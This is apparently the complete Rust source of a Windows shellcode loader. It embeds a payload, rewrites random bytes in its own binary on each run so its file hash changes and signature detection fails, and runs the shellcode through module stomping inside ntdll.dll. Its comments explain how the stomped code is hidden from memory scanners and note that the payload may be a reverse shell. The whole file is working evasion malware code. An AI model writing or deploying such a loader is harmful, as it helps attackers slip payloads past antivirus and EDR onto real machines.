mod logger;
use dinvoke_rs::overload;
use dinvoke_rs::dmanager::Manager;
use hexspell::pe::PE;
use std::fs;
use getrandom::fill;
use std::env::current_exe;
use std::str::from_utf8;

#[used]
#[unsafe(link_section = ".counter")]
static COUNTER: [u8; 8] = [0u8; 8];
static SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");

fn fill_random(buf: &mut [u8]) -> Result<(), String> {
    fill(buf).map_err(|e| format!("getrandom: {}", e))
}

// Fill `.counter` with fresh random bytes and swap the binary in place.
// The point is the file hash, not the value: every run rewrites 8 bytes,
// so no two on-disk copies are byte-identical. `self-replace` handles
// the Windows lock on the running executable by swapping after exit.
fn bump_counter() -> Result<(), String> {
    let exe_path = current_exe().map_err(|e| format!("current_exe: {}", e))?;
    let exe_str = exe_path.to_str().ok_or_else(|| "exe path is not valid UTF-8".to_string())?;
    let mut pe = PE::from_file(exe_str).map_err(|e| format!("parse PE: {:?}", e))?;

    let (raw_offset, raw_size) = pe
        .sections
        .iter()
        .find(|s| {
            let name_bytes = s.name.value.0.as_slice();
            from_utf8(name_bytes)
                .unwrap_or("")
                .trim_end_matches('\0') == ".counter"
        })
        .map(|s| {
            (
                s.pointer_to_raw_data.value as usize,
                s.size_of_raw_data.value as usize,
            )
        })
        .ok_or_else(|| ".counter section not found".to_string())?;

    if raw_size < 8 {
        return Err(format!(".counter too small ({} bytes)", raw_size));
    }

    let end = raw_offset.checked_add(8).ok_or_else(|| ".counter offset overflow".to_string())?;
    if end > pe.buffer.len() {
        return Err(format!(
            ".counter offset 0x{:X}+8 exceeds file size 0x{:X}",
            raw_offset,
            pe.buffer.len()
        ));
    }

    let mut random_bytes = [0u8; 8];
    fill_random(&mut random_bytes)?;
    pe.buffer[raw_offset..end].copy_from_slice(&random_bytes);

    // Write to a temp file, then swap it in with self-replace.
    let tmp_path = exe_path.with_extension("new");
    let tmp_str = tmp_path.to_str().ok_or_else(|| "tmp path is not valid UTF-8".to_string())?;
    pe.write_file(tmp_str).map_err(|e| format!("write_file: {:?}", e))?;

    self_replace::self_replace(&tmp_path).map_err(|e| format!("self_replace: {:?}", e))?;
    let _ = fs::remove_file(&tmp_path).map_err(|e| format!("cannot delete the tmp file {:?}" , e))?;

    Ok(())
}

fn execute_shellcode() -> Result<(), String> {
    // for more information on how that technique works use the crate docs
    // http://crates.io/crates/dinvoke_rs/0.2.2
    unsafe {
        // Copy the compile-time embedded shellcode into a heap Vec.
        let shellcode_vec = SHELLCODE.to_vec();

        // Load a legitimate, signed DLL to use as the stomping ground.
        // `ntdll.dll` is chosen because it is always mapped into every process
        // and has many sizable functions — good candidates to overwrite.
        // Loading by name also avoids a static import entry in our IAT.
        let my_dll = dinvoke_rs::dinvoke::load_library_a("ntdll.dll");
          if my_dll == 0 {
            return Err("cant find the provided dll".to_string());
        }
        // Overwrite a function inside the loaded DLL with our shellcode.
        // Arguments:
        //   &shellcode_vec — the payload bytes to write
        //   0              — let DInvoke pick the target function automatically
        //                    (it iterates the DLL's exception data looking for
        //                    a function large enough to hold the shellcode)
        //   my_dll         — the module base address to stomp into
        // Returns (original_bytes, stomp_address):
        //   original_bytes — the DLL code that was overwritten (used by dmanager
        //                    to restore the DLL to its clean state)
        //   stomp_address  — the address where the shellcode now lives
        let module = overload::managed_module_stomping(&shellcode_vec, 0, my_dll).map_err(|e| format!("error while tring to excute the shellcode {:?}", e))?;

        let original_bytes = module.0;
        let stomp_address = module.1;
        // 1. Create the manager and register the stomped shellcode
        let mut manager = Manager::new();
        // The manager takes ownership of the shellcode bytes and the original DLL bytes.
        // The return value is a Result, so we need to handle it.
        let _ = manager.new_shellcode(stomp_address, shellcode_vec, original_bytes);
        // 2. Hide the shellcode immediately after stomping.
        //    This restores the DLL's original code, so memory scanners see the clean DLL.
        let _ = manager.hide_shellcode(stomp_address);
        // 3. When you actually want to run the shellcode, restomp it first.
        let _ = manager.stomp_shellcode(stomp_address);
        // 4. Execute it.
        let func: unsafe extern "system" fn() = std::mem::transmute(stomp_address);
        func();
        // 5. Hide it again after execution (if the shellcode returns).
        //    If the shellcode exits the process (like a reverse shell), this line won't be reached.
        let _ = manager.hide_shellcode(stomp_address);
            
        Ok(())
    }
}

fn main() {
    match bump_counter() {
        Ok(()) => {
            logger::log_info("Polymorphic signature updated successfully");
        }
        Err(e) => {
            #[cfg(debug_assertions)]
            logger::log_error(&format!("Polymorphic signature updated failed: {:?}", e));
        }
    }

    match execute_shellcode() {
        Ok(()) => {
            logger::log_ok("Shellcode executed successfully");
        }
        Err(e) => {
            #[cfg(debug_assertions)]
            logger::log_error(&format!("Shellcode failed to execute: {:?}", e));
        }
    }
}